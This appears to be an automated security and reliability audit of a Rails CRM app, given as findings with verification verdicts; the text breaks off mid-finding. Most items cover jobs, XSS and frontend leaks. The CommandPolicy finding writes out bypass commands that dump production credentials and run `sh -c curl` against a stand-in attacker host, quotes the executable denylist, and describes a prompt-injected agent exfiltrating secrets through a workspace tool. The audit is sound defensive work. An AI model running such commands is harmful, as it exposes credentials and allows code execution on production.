verdict.reason: Re-read all cited files plus RenderClient, ApplicationJob, recurring.yml, and the GitHub watchdog. The canary chain advances solely by self-re-enqueue (canary_job.rb:75-77; runner.rb:168) and ApplicationJob has no retry_on, so one unhandled raise kills it permanently. Concrete trigger: RenderClient#request (render_client.rb:80) does not wrap network exceptions — a Net::ReadTimeout/OpenTimeout/ECONNRESET from deploy_for_commit at canary_job.rb:27 escapes both rescue clauses (lines 61/67 catch only RenderClient::ConfigurationError/Error), failing the job with no requeue and no notification; the upgrade sits in :canary forever and the degraded-deploy rollback never engages. Worker-kill mid-execution is the second trigger and is corroborated by the codebase itself: SlackSessionRecoverySweepJob and AgentScheduleDispatcherJob#resume_stale_agent_flows exist precisely because Solid Queue does not resurrect jobs whose worker died in a deploy restart, and SelfUpgrade got no equivalent sweep (verified: nothing in recurring.yml, DriftHeartbeatJob, or AgentHealthCheckJob touches SelfUpgrade). The GitHub watchdog probes only /up and agent_runtime_health, so a healthy app with a dead canary chain passes it. The SelfUpgradeStepJob chain has the same fragility (check_shipping! rescues only CodeShippingClient::Error; the SHIPPING_TIMEOUT check only runs if the job runs). Severity stays high because this silently defeats the rollback safety net for autonomously self-merged code, exactly at deploy time when it matters most.
verdict.ship_risk: Low. No client email involved (touches_client_email=false) and no API/schema changes — the fix is a rescue clause plus an additive sweep in an existing every-minute job, mirroring the proven resume_stale_agent_flows pattern; both re-enqueued jobs are documented idempotent polls. Two cautions: (1) a bare rescue StandardError → requeue could loop forever on a persistent error, so cap consecutive rescues or fail!+notify after N attempts, and give the dispatcher sweep a hard max-age cutoff so ancient stuck upgrades don't get resurrected; (2) app/jobs/self_upgrade* is on SelfUpgrade::PROTECTED_PATHS, so if shipped through the self-upgrade pipeline it requires human approval — a normal human PR avoids that. Also ensure the sweep re-enqueues at most one job per stuck upgrade per tick to avoid pile-up.

title: Permanently failed Solid Queue jobs are invisible: no drift signal watches the failed set, and ApplicationJob keeps DeserializationError failures forever
description: Several jobs deliberately re-raise 'so the failure is visible in the job backend' (SendContractForSigningJob, ProcessInboundEmailJob, ScheduledAgentRunJob), but the only place those failures land is Mission Control, which Brian — non-technical, phone-first — never opens. AgentDriftMonitor watches stale syncs, overdue agents, and failing AgentTasks, but not SolidQueue::FailedExecution. Separately, ApplicationJob is completely bare: the stock `discard_on ActiveJob::DeserializationError` is still commented out while TicketSearchResultEnrichmentJob (line 14) and SendOutreachEmailJob receive AR records via GlobalID — deleting a ticket search result or outbound email with a job in flight produces an undiscardable failed job that sits in the failed set as noise forever.
failure_or_value: Value: today a contract signing email that fails all 5 retries, or an unrouted inbound email crash, dies silently in a dashboard nobody watches. A drift signal turns 'failed jobs exist' into a Kerri DM within 24h — the same channel every other fleet problem already uses. The discard_on change stops phantom failures from polluting that signal.
fix_sketch: (1) In ApplicationJob: `discard_on ActiveJob::DeserializationError` and `retry_on ActiveRecord::Deadlocked, wait: 5.seconds, attempts: 3`. (2) Add a signal to AgentDriftMonitor: count `SolidQueue::FailedExecution.where(created_at: 24.hours.ago..)`, group by job class name (parse from the associated job), and emit a :warn signal listing 'N failed jobs: SendContractForSigningJob x2, ...' so DriftHeartbeatJob's existing 7:30am DM carries it. Purely additive; no API or schema changes.

verdict.reason: Re-read confirms every load-bearing claim. ApplicationJob (app/jobs/application_job.rb:3,6) still has both stock rescues commented out; TicketSearchResultEnrichmentJob and SendOutreachEmailJob receive AR records via GlobalID, so deleting the record with a job enqueued produces an ActiveJob::DeserializationError that no retry_on/discard_on covers — a permanent solid_queue_failed_executions row. Nothing watches that table as an alert: AgentDriftMonitor's three signal families (agent_drift_monitor.rb:45-48) and TaskQueueHealth's checks are all Task/Agent/IntegrationConnection level; the only FailedExecution reference in app code (slack/session_recovery.rb:172) is scoped to pruned Slack jobs. SendContractForSigningJob (lines 43-63, re-raise 'so the failure is visible in the job backend') and ProcessInboundEmailJob (line 77, no retry_on at all) genuinely dead-end in Mission Control at /admin/jobs, which the non-technical owner never opens — a contract-signing email that exhausts 5 retries reverts to draft with no DM or task. DriftHeartbeatJob + config/recurring.yml:73 already provide the daily Slack DM channel, so the fix is small and additive. One overstatement docked: ScheduledAgentRunJob failures are mostly covered already — ScheduledRunFailureAlertJob (enqueued at scheduled_agent_run_job.rb:84,436) files a deduped Task, so only its edge cases reach the failed set. That narrows the blast of the gap but two silent paths plus the whole DeserializationError class remain, so the upgrade stands at medium.
verdict.ship_risk: Low. The drift-signal addition is a read-only query inside a monitor that already rescues its own errors and rides an existing daily Slack DM — no API field changes, no schema changes, no client email (touches_client_email=false; alerting on failed sends produces fewer silent client-facing failures, not more sends). discard_on ActiveJob::DeserializationError is the stock Rails recommendation and only fires when the underlying record is already deleted (nothing to act on); it does mean those jobs vanish without a failed record, which is the intent. retry_on ActiveRecord::Deadlocked applies globally including email-sending jobs, but a deadlock rolls back the transaction before any send, and both SendOutreachEmailJob (atomic claim) and SendContractForSigningJob (draft? guard) are already retry-idempotent. Main tuning risk is signal noise: the 24h window must query FailedExecution.created_at (column exists) rather than total backlog, or one old stuck row would page daily; and severity should be :warn so it doesn't flip any :error-gated behavior. Mission Control at /admin/jobs remains the remediation surface either way.

title: SendContractForSigningJob flips the contract to 'sent' before delivery with no post-hoc confirmation marker — a crash in the window shows 'sent' while the client never got the signing link
description: The job stamps status: :sent + sent_at (lines 28-32) BEFORE `deliver_now` (line 35). That ordering is the right call for double-send safety (the rescue reverts to draft on an in-process delivery failure), but a hard worker kill between the status update and delivery — or during delivery — skips the rescue entirely: the contract permanently reads 'sent', the retried/re-run job no-ops on the `draft?` guard, and there is no delivery-confirmation field to distinguish 'sent and delivered' from 'claimed but never delivered'. Nothing sweeps for it.
failure_or_value: Failure: deploy restart lands mid-job; Brian sees the contract as 'sent for signing', waits days for a signature that can never come because the client never received the email. The deal stalls silently — the worst kind of pipeline bug for a sales-driven business.
fix_sketch: Additive column `delivery_confirmed_at` on contracts, stamped immediately after `deliver_now` succeeds. Add a check (fits naturally in AgentDriftMonitor or the AgentHealthCheckJob daily pass) for contracts `sent` with `delivery_confirmed_at` nil older than ~15 minutes → file a Task card: 'Contract N shows sent but delivery was never confirmed — check the Sent folder; if absent, revert to draft and re-send.' Never auto-resend (mirrors the send_unconfirmed pattern in SendApprovedDraftsJob). No new client email is introduced.

verdict.reason: Re-read confirms every element: send_contract_for_signing_job.rb stamps status :sent + sent_at (lines 28-32) before deliver_now (line 35); the rescue only catches in-process exceptions, so a hard worker kill in that window (deploy past Solid Queue shutdown timeout, OOM, SIGKILL) leaves the contract permanently 'sent'. The re-run of the released job no-ops on the draft? guard (line 19) by deliberate double-send design. Schema check (db/schema.rb:672-702) confirms no delivery_confirmed_at or equivalent column; the contract_sent activity entry is not reliable (the job's own rescue comment at lines 48-52 says it can be missing after a successful delivery). Ripgrep confirms no sweep anywhere reconciles sent-but-unconfirmed contracts; the send_unconfirmed escalation pattern exists only in send_approved_drafts_job.rb. Concrete failure: worker dies between line 32 and 36 → Brian sees 'sent', client never got the signing link, nothing ever flags it. Severity stays low because the window is small and contract sends are infrequent, but the silent-stalled-deal consequence and the cheap additive fix make it worth doing.
verdict.ship_risk: Low if scoped as sketched: an additive delivery_confirmed_at column and a read-only daily sweep that files an internal Task card are API-safe (no field renames, agents unaffected). The critical guardrail is client email: contract signing mail is client-facing, so the sweep must NEVER auto-resend — it must only surface a card telling Brian to check the Sent folder and manually revert to draft if the email is truly absent (mirroring the send_unconfirmed human-escalation pattern in SendApprovedDraftsJob). Stamping delivery_confirmed_at must go after deliver_now and before track_activity!, and the rescue's delivered-but-bookkeeping-failed branch must also stamp it, or the sweep will false-positive on exactly the case the code already warns 'do NOT re-send' — a false card that tempts a manual re-send is the main way this fix could cause a double client email. No changes to send ordering or the draft? guard should be made; the current ordering is correct double-send protection.

title: XSS: autocomplete renders remote suggestion text/subtitle/badge into innerHTML unescaped
description: renderSuggestions() builds HTML strings that go into resultsTarget.innerHTML (lines 545/586). `displayText` is either raw `text` or highlightText(text, query), and highlightText (line 698-702) does a regex replace on the RAW string with no HTML escaping; `subtitle` (suggestion.subtitle || email || description) and `badge` are interpolated raw at lines 635-637. Only the data-value attribute is escaped (line 625). Suggestion JSON comes from CRM search endpoints whose names/emails/descriptions originate from Apollo, exhibitor imports, and inbound email.
failure_or_value: A contact or company whose name contains `` (imported from an external feed or set by any org member) executes script in the searcher's session as soon as it appears in autocomplete results — i.e., typing in the search box triggers the payload. Same stored-XSS blast radius as the toast issue, on a component used across companies index, deal forms, and Devise-adjacent forms.
fix_sketch: Escape before highlighting: in renderSuggestions compute `const safeText = this.escapeHtml(text)` (helper already exists at line ~1078) and pass that to highlightText; in highlightText escape the input first, then wrap matches in <mark> (match on the escaped string, or highlight by index on the raw string and escape the segments). Escape subtitle the same way; require badge/customIcon to be developer-supplied only and document that, or escape them too.

verdict.reason: Re-read confirms the mechanics exactly: renderSuggestions (autocomplete_controller.js:601-637) interpolates suggestion text/subtitle/badge raw into an HTML string assigned to resultsTarget.innerHTML (lines 545/586), and highlightText (698-702) regex-replaces on the unescaped string; only data-value is escaped (625). A live attacker-influenceable path exists: deals/new_sponsor.html.erb wires the controller to DealsController#search_sponsors (deals_controller.rb:385-387), which returns raw company names as JSON — names originating from Apollo enrichment, exhibitor imports, and agent-created records with no sanitization. Concrete input: a lead-stage deal whose company name contains ; typing a matching 2-char query in the sponsor quick-add executes the payload. Severity adjusted from high to medium because the finding overstates the surface: companies/index and Devise views only use the HTML autocomplete="off" attribute (not this controller), the ⌘K palette injects server-escaped ERB HTML, and the single live endpoint returns no subtitle/badge fields — so today's real vector is one search box on the deals board in a 3-person internal app. Still a genuine stored XSS in a shared RailsBlocks component that every future usage inherits.
verdict.ship_risk: Low. Fix is purely client-side JS escaping in one controller — no API field changes (agents unaffected), no schema changes, no client email involvement (touches_client_email=false). Only regression risks: (1) double-escaping if a future caller intentionally passes HTML via badge/customIcon — escape text/subtitle but document badge/customIcon as developer-trusted, or escape them too since no live caller uses them; (2) highlight matching must be done carefully (escape-then-mark, or highlight by index and escape segments) so queries containing &, <, or quotes still highlight correctly. Verify the sponsor quick-add dropdown still renders and highlights after the change.

title: Kanban drag failures are silent: showError dispatches 'toast:show' but the toast system listens for 'toast-show'
description: kanban_controller.showError() dispatches `new CustomEvent("toast:show")` on this.element. toast_controller only listens for `"toast-show"` on window, and ripgrep confirms nothing anywhere listens for "toast:show". Additionally the detail shape wouldn't match handleToastShow's expectations even if the name matched (it expects detail.message/type which happens to match, but the event never arrives).
failure_or_value: Brian drags a task or deal to a new column on his phone, the PATCH fails (flaky mobile network, 422, expired session): revertDrag() snaps the card back with zero user-visible feedback. On the approval board this reads as 'the drag didn't take' or worse, he doesn't notice the revert and believes the stage/status changed when it didn't — a data-integrity trap on his primary surface.
fix_sketch: Replace showError with `if (window.toast) window.toast(message, { type: "error" }); else window.dispatchEvent(new CustomEvent("toast-show", { detail: { message, type: "error" } }))`. Two-line change; verify by killing the network in devtools and dragging a card.

verdict.reason: Re-read both files. kanban_controller.js:217 dispatches CustomEvent("toast:show") on this.element; toast_controller.js:42 listens only for "toast-show" on window. Ripgrep over app/ (excluding compiled builds) shows the dispatch site is the ONLY occurrence of "toast:show" in the codebase — no listener, no Stimulus data-action binds it, so the event is a guaranteed no-op. The failure path is concretely reachable: any non-2xx PATCH response (422, expired-session 401) or a network throw during a drag hits revertDrag() + showError() at kanban_controller.js:167-170/181-184, and the user gets zero feedback beyond the card silently snapping back. The proposed fix works: the toast container partial is rendered in app/views/layouts/application.html.erb (lines 90 and 107), so window.toast exists on kanban pages, and a "toast-show" window dispatch with {message, type} matches handleToastShow's detail shape exactly.
verdict.ship_risk: Very low. Pure frontend two-line change in one Stimulus controller; no API fields, no DB schema, no client email (touches_client_email=false — the toast is internal Console UI only). Only operational note: JS must be rebuilt (esbuild → app/assets/builds) for the fix to reach production, and verification should include a devtools offline-drag test plus a forced 422 to confirm the toast renders on both deals and sponsors boards.

title: Memory leak: dropdown_popover and context_menu leak document-level listeners on every Turbo navigation
description: dropdown_popover_controller connect() adds an anonymous `document.addEventListener("keydown", ...)` (line 44-48) that disconnect() never removes (it only cleans up observers and the scroll handler). context_menu_controller disconnect() calls `document.removeEventListener("click", this.closeMenu.bind(this))` and the same for keydown (lines 39-41) — `.bind()` creates a NEW function, so these removals are no-ops; the listeners added at connect (lines 16, 18) stay forever. Each leaked closure retains `this`, pinning the entire controller and its detached DOM subtree.
failure_or_value: dropdown-popover is the RailsBlocks dropdown used on nearly every page, often several per page. In the installed PWA that Brian keeps open for days, every Turbo visit permanently adds N document keydown/click handlers and pins N detached DOM trees. After a day of navigation that's hundreds of stale handlers running on every keypress/click (touching detached nodes), growing memory until iOS kills the web view — the classic 'the app gets slow until I force-close it' failure.
fix_sketch: dropdown_popover: store `this.escHandler = (e) => {...}` in connect, `document.removeEventListener("keydown", this.escHandler)` in disconnect. context_menu: bind once in connect (`this.boundCloseMenu = this.closeMenu.bind(this)` etc.), pass the same reference to add/removeEventListener — mirroring the pattern already used correctly in menu_controller.js:15. Also fix the same no-op `.bind()` removal in lightbox_controller.js:548.

verdict.reason: Re-read both files: dropdown_popover_controller.js connect() (lines 44-48) adds an anonymous document keydown listener that disconnect() (lines 190-200) never removes — it only cleans up the scroll handler and two observers. The controller runs on every page: _property_switcher.html.erb:14 uses data-controller="dropdown-popover", rendered via _topbar.html.erb:16 in the application layout, so each Turbo navigation leaks one document listener pinning the disconnected controller and its detached DOM subtree (plus 3 more per visit to deals/sponsors). context_menu_controller.js disconnect() lines 39-41 pass fresh .bind(this) functions to removeEventListener, making the removals no-ops for the listeners added at lines 16/18 — a real code bug, though currently latent since no view uses context-menu yet. lightbox_controller.js:548 has the same no-op .bind() removal. The codebase itself confirms the failure mode: menu_controller.js:12-16 binds once with a comment explicitly warning that anonymous document listeners "would never be cleaned up and would accumulate" under Turbo. One correction to the finding: "often several per page" overstates it — typically 1 instance per page, 3-4 on the sponsors page — so growth is slower than described, but in a PWA kept open for days on Brian's phone the leak is real and monotonic. Medium severity is right: genuine memory/CPU degradation in the primary usage pattern (long-lived mobile PWA), no data-integrity or security impact.
verdict.ship_risk: Very low. Pure client-side JavaScript cleanup with no server, database, API, or email surface — no client-email risk and no /api/v1 backward-compat risk. The fix mirrors the pattern already proven in menu_controller.js (store bound/arrow handler in connect, remove same reference in disconnect). Only regressions to watch: (1) Escape-to-close on dropdowns must still work after moving the handler to a named reference — verify manually on the property switcher; (2) context-menu is unused in views today, so its fix can only be validated in isolation or via JS tests; (3) do not "fix" by removing the listeners entirely — they must remain per-connect. Behavior is otherwise identical; the change only affects teardown.

title: select_controller (TomSelect) leaks listeners/observers on clearInput and observes document.body per instance
description: Three compounding issues: (1) clearInput() (line 1689+) re-runs #setupPositioning() without tearing down the previous one — this.scrollHandler/resizeObserver/mutationObserver are overwritten, so the old window scroll listener and two observers leak on every clear-button click; #cleanup only removes the latest. (2) #setupInfiniteScroll (547-554) tries to dedupe with `content.removeEventListener("scroll", handler)` where handler is a fresh `.bind()` — a no-op, so each dropdown open stacks another scroll handler. (3) #setupReadonlyInput adds a `document.addEventListener("mousemove", ...)` (636-638) that is never removed. Separately, #setupPositioning attaches a MutationObserver watching `document.body` with `{childList:true, subtree:true}` PER select instance (line 525), so every DOM mutation anywhere fires a callback for every select on the page.
failure_or_value: On a form with 5+ selects, every Turbo Stream update or morph triggers 5+ mutation callbacks each calling computePosition; clicking the clear button 10 times leaves 10 window scroll listeners repositioning a destroyed dropdown on every scroll frame — measurable jank on phone. The document mousemove listener (which calls exitPointerLock) accumulates one per disableTyping select per page visit, forever.
fix_sketch: (1) Extract a #teardownPositioning() and call it at the top of #setupPositioning (or from clearInput before re-setup). (2) Store the bound handler once (`this.infiniteScrollHandler ||= this.#handleScroll.bind(this)`) and add/remove that reference. (3) Store the mousemove handler on `this` and remove it in #cleanup. (4) Scope the MutationObserver to `this.select.dropdown` (all it actually needs is dropdown open/content changes) instead of document.body, or only attach it while the dropdown is open.

verdict.reason: All four sub-claims verified against select_controller.js. (1) clearInput (line 1689) calls #setupPositioning (1707) with no teardown; #setupPositioning (513-526) overwrites this.scrollHandler/resizeObserver/mutationObserver, and #cleanup (1760-1762) only removes the latest, so each clear-button click (wired at 868-872) leaks one capture-phase window scroll listener, one ResizeObserver on documentElement, and one body-wide MutationObserver, each re-running #updatePosition (async computePosition + forced layout) redundantly. (2) #setupInfiniteScroll (547-554) removes a freshly-bound function — a guaranteed no-op — so a scroll handler stacks on dropdown_content every dropdown_open for URL-backed selects (functional damage bounded by the loadingMore guard at 567/569). (3) #setupReadonlyInput adds a document mousemove listener (636-638) absent from #cleanup; document survives Turbo visits so it accumulates unbounded, one per connect of a disableTyping select plus one per clearInput (via #setupEventHandlers line 244). (4) Line 525 observes document.body {childList,subtree:true} per instance; the gate at 521 (classList.contains("ts-dropdown")) is always true for a live TomSelect dropdown, so every body mutation fires #updatePosition per select (closed dropdowns short-circuit at 1211 but only after two getBoundingClientRect forced-layout calls). Minor inaccuracy in the finding: leaked handlers reposition the current dropdown redundantly (shared `this`), not a "destroyed" one — the leak and per-scroll duplicated work are still real. Severity stays medium: real accumulating leaks and mobile jank in a widely-used controller, but no data corruption or security impact.
verdict.ship_risk: Low blast radius: pure frontend Stimulus fix, no API fields, no DB schema, no client email (touches_client_email=false). Main regression risks: (a) the fix-sketch idea of scoping the MutationObserver to this.select.dropdown would break repositioning when OTHER page content shifts the control (e.g., Turbo Streams inserting content above an open dropdown) — safer to keep observing body but only while the dropdown is open, disconnecting on close; (b) teardown-ordering bugs in clearInput could leave the reinitialized select without positioning handlers, so dropdown placement (especially on phone) needs manual verification after the change; (c) if the mousemove/pointer-lock handler is removed too aggressively, the disableTyping type-ahead pointer-lock exit could stop working. Verify with dropdown open/close, clear-button, infinite-scroll, and Turbo navigation on mobile viewport before shipping.

title: Upgrade: vendor the four CDN stylesheets so the console works offline and on flaky mobile networks
description: The layout loads Shoelace (JS module + 2 themes), tom-select.css, air-datepicker.css, and photoswipe.css from cdn.jsdelivr.net on every page (lines 28-47), and lightbox_controller injects the photoswipe CSS from the CDN again at runtime. The JS bundles for tom-select/air-datepicker/photoswipe are already installed via yarn and bundled locally — only the CSS (plus the Shoelace color-picker) still round-trips to a third-party CDN with no data-turbo-track, no SRI, and no offline fallback.
failure_or_value: Concrete value: (a) On Brian's phone with a weak signal or in the installed PWA when jsdelivr is slow/unreachable, every select, date picker, and lightbox renders unstyled/broken while the rest of the app works — currently the single biggest reliability gap for the mobile approval flow; (b) removes a third-party supply-chain script (Shoelace module) from an app that holds the company brain and API keys; (c) lets a future CSP drop the jsdelivr allowance.
fix_sketch: Copy tom-select.css, air-datepicker.min.css, photoswipe.css from node_modules into app/assets/stylesheets/vendor/ (or @import them in application.tailwind.css since the packages are already in package.json), delete the four <link>/<script> CDN tags and the loadCSS() method in lightbox_controller. For Shoelace, add @shoelace-style/shoelace to package.json and import the color-picker component + themes through esbuild. Verify with devtools offline mode: selects and date pickers stay styled.

verdict.reason: Every claim survives re-reading: application.html.erb:28-47 loads 5 jsdelivr resources (Shoelace color-picker JS module + 2 theme CSS, tom-select.css, air-datepicker.min.css, and an UNVERSIONED photoswipe.css) with no SRI and no data-turbo-track; lightbox_controller.js:19-27 injects photoswipe CSS from the CDN at runtime. package.json already has tom-select/air-datepicker/photoswipe and the Stimulus controllers import them locally, so only the CSS (plus the Shoelace script — the sole remotely-loaded executable code in the page) round-trips to a third party. Nothing is vendored (app/assets/stylesheets contains only application.tailwind.css). The finding is actually conservative: <sl-color-picker> is used nowhere in app/views or app/javascript (only inert --sl-* variable overrides at application.tailwind.css:1020-1032), so the Shoelace tags can likely be deleted outright instead of bundled, making the fix cheaper than sketched. Concrete failure: flaky mobile network or jsdelivr degradation leaves selects, date pickers, and lightboxes unstyled in Brian's phone-first approval flow while the same-origin app shell loads fine. CSP (script_src :self,:https, report_only) doesn't block jsdelivr today, so that benefit is future-enabling rather than immediate — hence medium, not high.
verdict.ship_risk: Low and frontend-only: no client email (touches_client_email=false), no /api/v1 fields, no DB schema. Real risks: (1) if Shoelace themes are removed without checking, any hidden consumer of --sl-* variables or a dynamically-rendered sl-color-picker would lose styling — grep shows zero consumers but a visual pass on color-related UI is warranted; (2) vendored CSS must actually ship — stylesheet_link_tag :app only links the built application.css, so the CSS should be @imported into application.tailwind.css (or added to the esbuild/Tailwind pipeline) and verified in a production-mode asset build, not just dropped into a vendor/ dir; (3) the layout's unversioned photoswipe.css means today's rendering tracks latest — vendoring pins to package.json's ^5.4.4, a tiny chance of visual diff in the lightbox; (4) verify with devtools offline/blocked-jsdelivr that selects, date pickers, and lightbox stay styled before calling done.

title: Upgrade: Ask Savant copilot loses the whole conversation on every page navigation
description: The copilot's history lives only in `this.history = []` set in connect(), and the panel is inside the body wrapper that Turbo replaces on every visit (layout line 83). Any navigation — including tapping a deal link that Savant itself just surfaced — reconnects the controller, wiping both the on-screen transcript and the model context. The natural copilot flow ('show me the deal' -> tap it -> 'now draft the renewal note') is impossible: the second question starts a blank conversation.
failure_or_value: Concrete value: the in-app agent becomes usable as an actual working companion instead of a single-page Q&A box. On phone, where Brian constantly hops between board, task, and deal pages, this is the difference between the copilot being used and being abandoned. Also unlocks slice 2 (actions + audit) since multi-step confirmations need surviving a navigation.
fix_sketch: Persist `this.history` (and rendered messages) to sessionStorage keyed per-user (e.g. `askSavant.history`), write-through in send(), and in connect() rehydrate + re-render via the existing appendMessage(). Cap at ~30 messages and clear on logout (hook devise sign-out link or check a user-id stamp in the stored blob). Alternative: mark the panel `data-turbo-permanent`, but sessionStorage also survives full reloads and PWA relaunches, so prefer it. Additive, no API/server change.

verdict.reason: Re-read confirms every claim: ask_savant_controller.js:10-13 resets this.history=[] in connect() with no persistence anywhere (no sessionStorage/localStorage/data-turbo-permanent in the controller or any view); the controller and panel live on the signed-in shell wrapper (application.html.erb:83, panel rendered line 98) which Turbo Drive (active via application.js:2) replaces on every visit; and the server endpoint is stateless (app/controllers/ask_savant_controller.rb:20 rebuilds history from the client's messages param each POST), so the client wipe is total context loss. Concrete repro: ask about a deal, tap any board/sidebar link, reopen the panel — welcome text only, and the follow-up posts a one-message history. The upgrade does not already exist, and stepper_controller.js already uses the exact sessionStorage write-through/rehydrate pattern, making it low-effort and idiomatic. High value for Brian's phone-hopping usage and a prerequisite for slice-2 multi-step action confirmations.
verdict.ship_risk: Low. Pure client-side JS change: no API fields renamed/removed, no schema change, nothing near client email (touches_client_email=false). Two hazards to handle in the fix: (1) stamp the stored blob with the user id and clear it on sign-out, or a shared-device sign-in could rehydrate the previous user's conversation into the panel and into the POSTed history; (2) cap replayed history (~30 messages) so POST bodies and model context don't grow unboundedly. Avoid the data-turbo-permanent alternative — the wrapper div hosts command-palette/sidebar/pwa controllers too, so freezing it has wider blast radius than sessionStorage.

title: Upgrade: companies index renders the entire unpaginated company table
description: CompaniesController#index loads every company in the org (`@organization.companies.includes(:events)` with no limit/pagination) and the view renders one <tr> per company with per-row event chips. Eager loading avoids N+1, but the row count is unbounded. With the MapYourShow exhibitor feed about to be wired into lead-research (per the cold-queue sourcing plan), this table will grow into the thousands: a multi-MB HTML response parsed on a phone.
failure_or_value: Concrete value: keeps the CRM company list fast on mobile as imports scale — today a 2,000-company org would ship ~2MB of table HTML and lock the main thread for seconds on an iPhone; after pagination it's a constant ~50-row page. Also caps memory for the Turbo page cache, which snapshots the full DOM.
fix_sketch: Add Pagy (or `.limit(100).offset(...)` with simple prev/next links) in #index, defaulting to ~100 rows, preserving the existing q/event_id filter params; keep the search box as the primary access path. Purely additive to the HTML page — the /api/v1 companies endpoints already paginate and are untouched.

verdict.reason: Re-read confirms every claim: companies_controller.rb:25 loads the full brand-walled company scope with includes(:events) and no limit/pagination, and index.html.erb:66 renders a <tr> per company with per-row event chips. No pagination gem (pagy/kaminari/will_paginate absent from Gemfile), no Turbo lazy frame or virtualization on the page, and the search/event filters only bound the result when explicitly used — the bare index URL renders everything. The claim that /api/v1 already paginates is accurate (base_controller.rb:125-135, default 25/cap 100 with has_more), so the fix is purely additive HTML-side. The upgrade is real, feasible, and does not already exist. Severity stays low because the table is likely low-hundreds of rows today; the multi-MB scenario is contingent on the planned MapYourShow exhibitor import. Note: people_controller.rb#index has the identical unbounded pattern and should be fixed alongside.
verdict.ship_risk: Low. HTML page only — agents poll /api/v1, which is untouched and already paginated, so no API backward-compat exposure; nothing near client email (touches_client_email=false is correct). Two implementation gotchas: (1) the current index scope has no ORDER BY, so limit/offset without adding an explicit stable order (e.g. .order(:name, :id)) yields nondeterministic page contents; (2) prev/next links must carry the existing q and event_id params or filters silently drop on page 2. Also verify the event-filter join plus pagination doesn't need DISTINCT to avoid duplicate rows across pages.

title: CommandPolicy is a denylist that misses every shell and interpreter, allowing arbitrary code execution in the workspace
description: CommandPolicy validates workspace-run commands against a DENYLIST of executables (rm, sudo, curl, ssh...) but never lists sh, bash, zsh, ruby, python, node, perl, make, or `bin/rails runner`. Because DISALLOWED_EXECUTABLES.include?(File.basename(parsed.first)) only blocks named binaries, `sh -c "<anything>"`, `ruby -e "..."`, or `bin/rails runner "..."` all pass. The SHELL_META_PATTERN check only scans the OUTER command string, so quoted payloads with no top-level metacharacters (e.g. `sh -c "cat config/foo.key"`, `bin/rails runner "puts Rails.application.credentials.secret_key_base"`) sail through. Verified: `bin/rails runner "puts Rails.application.credentials.secret_key_base"` and `sh -c "curl attacker/x"` both classify as ALLOWED in a Shellwords/policy replica. This runs on the live production Render container (self-upgrade sandbox uses rails_env=production on the app server), so it is arbitrary code execution on prod with network access — the whole point of the executable/secret guards is defeated.
failure_or_value: An agent (or a user driving start_workspace_run, gated only to Brian/Ari/Benji) submits command `bin/rails runner "puts Rails.application.credentials.to_yaml"`; CommandPolicy allows it; the runner executes it on the production container and captures the dumped credentials into the WorkspaceRunEvent stdout (up to 12000 chars), which read_workspace_run then returns to the agent. `sh -c` similarly bypasses the curl/wget/ssh bans for exfiltration.
fix_sketch: Invert to an ALLOWLIST: permit only the specific executables self-upgrade/workspace runs need (git with the existing subcommand guard, bundle, bin/rails with an allowlisted subcommand set that excludes runner/console/dbconsole, rubocop, rspec, yarn/npm ci). At minimum add sh/bash/zsh/ruby/python/python3/node/perl/make/env/xargs/eval/exec to DISALLOWED_EXECUTABLES AND reject `rails runner|console|dbconsole` and interpreter eval flags (-e/-c). Also scan quoted argv tokens, not just the raw string, for secret patterns.

verdict.reason: Re-reading command_policy.rb confirms DISALLOWED_EXECUTABLES (lines 9-12) omits every shell/interpreter (sh, bash, ruby, python, node, perl, make) and never special-cases `bin/rails runner`. The executable check only inspects File.basename(parsed.first) (line 46-47), and SHELL_META_PATTERN (line 24) only scans the outer string, so quoted payloads pass. Concrete confirmed inputs: `bin/rails runner "puts Rails.application.credentials.secret_key_base"` classifies as ALLOWED (basename=rails; git validator skipped; the string matches none of SECRET_PATTERNS, since %r{config/credentials}i needs the literal path), and `sh -c "curl https://attacker/x"` is ALLOWED (sh not denied, curl is only a payload token, no top-level meta chars). runner.rb safe_env (259-271) plus ALLOWED_RAILS_ENVS including production and self_upgrades/runner.rb:82 setting rails_env=production mean these run on the live prod container with prod credentials/network, and stdout (12k chars) is returned via read_workspace_run — real arbitrary code execution + secret exfiltration. Downgraded from critical to high only because start_workspace_run is gated by code_shipping_role to allowlisted super_admins/full members (Brian direct, Ari/Benji confirm), so this is a defeated defense-in-depth control against a misbehaving/prompt-injected agent rather than an unauthenticated RCE; in a Brian-:direct session there is no confirm gate, keeping it solidly high.
verdict.ship_risk: Fix is feasible and low-blast-radius: the only production command set is SANDBOX_COMMANDS=["bin/rails eval:agent"] plus agent-generated bundle exec rspec / rubocop, so an allowlist (git with existing subcommand guard, bundle, bin/rails minus runner/console/dbconsole, rubocop, rspec, yarn/npm) preserves known callers, including eval:agent. Two caveats: command_policy_spec.rb:23-25 asserts the ruby -e rejection message matches /secrets/, which an executable allowlist changes, so that spec must be updated to keep the green suite green; and any ad-hoc agent-composed runs using ruby/node/make would newly fail, so size the allowlist against real self-upgrade telemetry before flipping enforcement. No client-email surface is touched (touches_client_email=false); no API field or DB column changes required.

title: Workspace subprocesses inherit the full production ENV (no unsetenv_others), exposing GitHub/Render/DB/SendGrid secrets
description: safe_env builds a curated env hash but run_process calls `Open3.popen3(safe_env, *argv, ...)` without `unsetenv_others: true`.
